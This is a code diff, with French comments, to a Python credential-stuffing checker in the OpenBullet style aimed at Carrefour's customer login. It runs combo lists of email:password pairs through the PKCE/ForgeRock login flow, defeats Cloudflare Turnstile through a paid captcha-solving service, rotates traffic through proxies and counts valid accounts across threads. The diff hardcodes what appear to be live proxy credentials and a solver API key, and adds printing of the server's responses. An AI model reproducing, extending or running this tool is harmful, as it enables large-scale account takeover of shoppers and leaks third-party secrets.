@@ -2,16 +2,13 @@
 """
 Flux style OpenBullet : PKCE → authorize → ForgeRock → Solverify Turnstile → POST login.
 
-Mode interactif (terminal) : demande le fichier combos (email:pass), le proxy http://…,
-la clé API captcha (Solverify), le nombre de threads ; affiche valid / invalid / error / cpm.
+Valeurs par défaut : fichier combos `s.txt`, proxy DataImpulse et clé Solverify préremplis dans le script
+(constantes DEFAULT_* ; surcharge via arguments ou variables d'environnement).
 
-Sans terminal : liste avec --combo-file et PROXY_URL / SOLVERIFY_KEY (ou --proxy / --solver-key),
-optionnel --threads (défaut 3).
+Mode interactif : invites avec défauts entre crochets (Entrée = défaut).
 
-Un seul compte : variables SOLVERIFY_KEY, CARREFOUR_USER, CARREFOUR_PASS et sortie non-interactive,
-ou --single en interactif.
-
-Forwarder optionnel : LOCAL_FORWARD_URL ou --forward-url.
+En cas d'erreur : exception FlowError avec corps HTTP (SOURCE) ; mode liste affiche SOURCE pour erreurs et pour
+réponses RETRY / CUSTOM / UNKNOWN.
 """
 
 from __future__ import annotations
@@ -32,8 +29,21 @@ from typing import Any
 
 import requests
 
+# Préconfiguration (surcharge possible : --combo-file, --proxy, --solver-key, variables d'environnement)
+DEFAULT_COMBO_FILE = "s.txt"
+DEFAULT_PROXY_URL = "http://82d92d98f73844034775:2206992348172521@gw.dataimpulse.com:823"
+DEFAULT_SOLVERIFY_KEY = "NHpps0GHnBe0v7MmFim6INi990j1drzhv49EUko3t0q8FStXRboY3ctdyU6i85TX"
+
 # --- PKCE (same alphabet as RFC 7636 / original Node script) ---
 _VERIFIER_CHARS = string.ascii_letters + string.digits + "-._~"
+
+
+class FlowError(Exception):
+    """Erreur métier avec corps HTTP / SOURCE optionnel pour diagnostic."""
+
+    def __init__(self, message: str, source: str | None = None) -> None:
+        super().__init__(message)
+        self.source = source if source is not None else ""
 
 
 def generate_code_verifier(length: int = 128) -> str:
@@ -167,6 +177,7 @@ def poll_turnstile_token(
     deadline = time.monotonic() + max_wait
     payload = {"clientKey": solver_key, "taskId": task_id}
     payload_json = json.dumps(payload)
+    last_body = ""
 
     while time.monotonic() < deadline:
         r = session.request(
@@ -176,6 +187,7 @@ def poll_turnstile_token(
             data=payload_json,
         )
         body = r.text
+        last_body = body
         if "processing" in body:
             time.sleep(poll_interval)
             continue
@@ -188,7 +200,7 @@ def poll_turnstile_token(
 
         err_id = obj.get("errorId")
         if err_id not in (0, None) and err_id != "0":
-            raise RuntimeError(f"getTaskResult error: {obj}")
+            raise FlowError(f"getTaskResult error: {obj}", source=body)
 
         token = _extract_turnstile_token(obj)
         if token:
@@ -197,7 +209,7 @@ def poll_turnstile_token(
         # Pas encore de token lisible (ex. statut completed mais champ différent) : réessayer
         time.sleep(poll_interval)
 
-    raise TimeoutError("Turnstile task did not complete in time")
+    raise FlowError("Turnstile task did not complete in time", source=last_body)
 
 
 def run_flow(
@@ -238,7 +250,10 @@ def run_flow(
     r1 = session.request("GET", url1, headers=h1, allow_redirects=False)
     loc1 = _location(r1)
     if not loc1:
-        raise RuntimeError(f"No Location after authorize: status={r1.status_code} body={r1.text[:300]}")
+        raise FlowError(
+            f"No Location after authorize: status={r1.status_code}",
+            source=r1.text,
+        )
 
     # 2) Follow Location1 with browser headers
     url2 = _absolute("https://moncompte.carrefour.fr/", loc1)
@@ -259,7 +274,10 @@ def run_flow(
     r2 = session.request("GET", url2, headers=h2, allow_redirects=False)
     loc2 = _location(r2)
     if not loc2:
-        raise RuntimeError(f"No Location after second GET: status={r2.status_code}")
+        raise FlowError(
+            f"No Location after second GET: status={r2.status_code}",
+            source=r2.text,
+        )
 
     # 3) GET moncompte path from loc2
     url3 = _absolute("https://moncompte.carrefour.fr", loc2)
@@ -312,7 +330,7 @@ def run_flow(
         except json.JSONDecodeError:
             auth_id = None
     if not auth_id:
-        raise RuntimeError(f"Could not parse authId from: {src4[:800]}")
+        raise FlowError("Could not parse authId from authenticate response", source=src4)
 
     # 5) Create Turnstile task
     task_payload = {
@@ -331,13 +349,16 @@ def run_flow(
         headers={"Content-Type": "application/x-www-form-urlencoded"},
         data=json.dumps(task_payload),
     )
-    task_body = json.loads(r5.text)
+    try:
+        task_body = json.loads(r5.text)
+    except json.JSONDecodeError:
+        raise FlowError(f"createTask invalid JSON: status={r5.status_code}", source=r5.text)
     err_id = task_body.get("errorId")
     if err_id not in (0, None, "0"):
-        raise RuntimeError(f"createTask error: {task_body}")
+        raise FlowError(f"createTask error: {task_body}", source=r5.text)
     task_id = task_body.get("taskId")
     if not task_id:
-        raise RuntimeError(f"No taskId in: {r5.text[:500]}")
+        raise FlowError("No taskId in createTask response", source=r5.text)
 
     token44 = poll_turnstile_token(session, solver_key=solver_key, task_id=str(task_id))
 
@@ -465,20 +486,23 @@ class RunStats:
             return self.valid, self.invalid, self.error, self._done, self._done / max(time.monotonic() - self._start, 1e-6) * 60.0
 
 
-def _prompt_nonempty(label: str, secret: bool = False) -> str:
+def _prompt_nonempty(label: str, secret: bool = False, default: str | None = None) -> str:
+    hint = f" [{default}]" if default else ""
     while True:
         if secret:
             try:
                 import getpass
 
-                v = getpass.getpass(f"{label}: ").strip()
+                v = getpass.getpass(f"{label}{hint}: ").strip()
             except (EOFError, KeyboardInterrupt):
                 raise
         else:
             try:
-                v = input(f"{label}: ").strip()
+                v = input(f"{label}{hint}: ").strip()
             except EOFError:
                 v = ""
+        if not v and default is not None:
+            return default
         if v:
             return v
         print("(valeur requise)", file=sys.stderr)
@@ -508,8 +532,8 @@ def process_combo(
     proxy_url: str | None,
     solver_key: str,
     forward_base: str | None,
-) -> tuple[str, bool]:
-    """Returns (outcome or 'EXCEPTION', is_exception)."""
+) -> tuple[str, bool, str | None]:
+    """Returns (outcome, is_exception, response_source_or_None)."""
     try:
         result = run_flow(
             username=username,
@@ -518,9 +542,17 @@ def process_combo(
             solver_key=solver_key,
             forward_base=forward_base,
         )
-        return str(result.get("outcome", "UNKNOWN")), False
-    except Exception:
-        return "EXCEPTION", True
+        outcome = str(result.get("outcome", "UNKNOWN"))
+        src = result.get("login_body") if outcome in ("RETRY", "CUSTOM", "UNKNOWN") else None
+        return outcome, False, src if isinstance(src, str) else None
+    except FlowError as e:
+        return "EXCEPTION", True, e.source or str(e)
+    except requests.HTTPError as e:
+        resp = e.response
+        src = resp.text if resp is not None else str(e)
+        return "EXCEPTION", True, src
+    except Exception as e:
+        return "EXCEPTION", True, str(e)
 
 
 def run_checker(
@@ -559,10 +591,21 @@ def run_checker(
             )
         for fut in as_completed(futures):
             try:
-                outcome, is_exc = fut.result()
+                outcome, is_exc, err_src = fut.result()
                 stats.record(outcome, exc=is_exc)
-            except Exception:
+                if is_exc and err_src:
+                    with lock_print:
+                        print(f"\n--- SOURCE (erreur) ---\n{err_src}\n--- fin SOURCE ---", flush=True)
+                elif not is_exc and err_src and outcome in ("RETRY", "CUSTOM", "UNKNOWN"):
+                    with lock_print:
+                        print(
+                            f"\n--- SOURCE ({outcome}) ---\n{err_src}\n--- fin SOURCE ---",
+                            flush=True,
+                        )
+            except Exception as e:
                 stats.record("UNKNOWN", exc=True)
+                with lock_print:
+                    print(f"\n--- SOURCE (erreur interne) ---\n{e!s}\n--- fin SOURCE ---", flush=True)
             on_done()
 
     print()
@@ -615,15 +658,23 @@ def main() -> None:
     if batch_mode:
         combo_path = args.combo_file
         if not combo_path:
-            if not is_tty:
-                raise SystemExit("Sans terminal interactif, utilisez --combo-file chemin.txt")
-            combo_path = _prompt_nonempty("Chemin du fichier combos (email:pass)")
+            if is_tty:
+                combo_path = _prompt_nonempty(
+                    "Chemin du fichier combos (email:pass)",
+                    default=DEFAULT_COMBO_FILE,
+                )
+            else:
+                combo_path = DEFAULT_COMBO_FILE
 
         proxy_url = args.proxy or env_proxy
         if not proxy_url:
-            if not is_tty:
-                raise SystemExit("Sans terminal interactif, définissez PROXY_URL ou --proxy")
-            proxy_url = _prompt_nonempty("Proxy (http://user:pass@host:port)")
+            if is_tty:
+                proxy_url = _prompt_nonempty(
+                    "Proxy (http://user:pass@host:port)",
+                    default=DEFAULT_PROXY_URL,
+                )
+            else:
+                proxy_url = DEFAULT_PROXY_URL
         proxy_url = proxy_url.strip()
         if not proxy_url.lower().startswith("http"):
             print("Le proxy doit commencer par http:// ou https://", file=sys.stderr)
@@ -631,9 +682,13 @@ def main() -> None:
 
         solver_key = (args.solver_key or env_solver or "").strip()
         if not solver_key:
-            if not is_tty:
-                raise SystemExit("Sans terminal interactif, définissez SOLVERIFY_KEY ou --solver-key")
-            solver_key = _prompt_nonempty("Clé API captcha (Solverify)")
+            if is_tty:
+                solver_key = _prompt_nonempty(
+                    "Clé API captcha (Solverify)",
+                    default=DEFAULT_SOLVERIFY_KEY,
+                ).strip()
+            else:
+                solver_key = DEFAULT_SOLVERIFY_KEY
 
         max_workers = args.threads if args.threads > 0 else (_prompt_int("Nombre de threads", default=3) if is_tty else 3)
 
@@ -652,8 +707,8 @@ def main() -> None:
         print(f"Terminé — valid={v} invalid={inv} error={err} total={done} cpm={cpm:.1f}")
         return
 
-    proxy_url = (args.proxy or env_proxy) if (args.proxy or env_proxy) else None
-    solver_key = (args.solver_key or env_solver).strip()
+    proxy_url = (args.proxy or env_proxy or DEFAULT_PROXY_URL).strip() if (args.proxy or env_proxy or DEFAULT_PROXY_URL) else None
+    solver_key = (args.solver_key or env_solver or DEFAULT_SOLVERIFY_KEY).strip()
     user = env_user
     password = env_pass
 
@@ -663,13 +718,23 @@ def main() -> None:
             "Mode un compte: exportez SOLVERIFY_KEY, CARREFOUR_USER, CARREFOUR_PASS ou utilisez --single avec ces variables."
         )
 
-    result = run_flow(
-        username=user,
-        password=password,
-        proxy_url=proxy_url,
-        solver_key=solver_key,
-        forward_base=forward_base,
-    )
+    try:
+        result = run_flow(
+            username=user,
+            password=password,
+            proxy_url=proxy_url,
+            solver_key=solver_key,
+            forward_base=forward_base,
+        )
+    except FlowError as e:
+        print(json.dumps({"error": str(e)}, indent=2), file=sys.stderr)
+        print("--- SOURCE ---", file=sys.stderr)
+        print(e.source, file=sys.stderr)
+        raise SystemExit(1)
+    except Exception as e:
+        print(json.dumps({"error": str(e)}, indent=2), file=sys.stderr)
+        raise SystemExit(1)
+
     print(json.dumps({k: v for k, v in result.items() if k != "login_body"}, indent=2))
     print("--- login response (truncated) ---")
     body = result["login_body"]
